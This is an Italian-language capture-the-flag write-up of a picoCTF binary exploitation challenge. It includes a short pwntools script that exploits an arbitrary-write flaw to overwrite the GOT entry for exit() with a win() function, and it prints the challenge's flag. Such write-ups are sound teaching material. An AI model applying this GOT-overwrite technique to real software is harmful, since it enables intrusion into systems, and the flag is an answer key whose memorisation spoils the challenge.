# Writeup

Il seguente programma chiede all'utente di specificare un indirizzo
e poi inserire il valore da sovrascrivere all'indirizzo scelto.

Sfrutto questa vulnerabilita' per sovrascrivere il comportamento della funzione `exit(1)`.
Tramite il seguente codice python:
```py
from pwn import *

context.binary = './auth'

p = process()

print(hex(context.binary.got['exit']))
print(context.binary.functions['win'])
p.sendline(hex(context.binary.got['exit']).encode('ascii'))
p.sendline(hex(context.binary.functions['win'].address).encode('ascii'))
p.interactive()
```
posso sovrascrivere la `GOT`, facendo in modo che quando viene chiamata la funzione `exit(1)`
in realta' venga eseguita `win()`, dato che la tabella GOT, ovvero quella che tiene conto
dei collecamenti con le libreria dinamiche, ora come valore della entry `exit` non ha piu'
l'indirizzo della DLL originale, bensi' l'indirizzo della funzione win.

Dopo il `p.interactive()` posso scrivere nella console ed eseguire il comando
`cat flag.txt`, cosi' facendo ottengo il valore della flag.

# Flag
```plain
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_7a9e7634}
```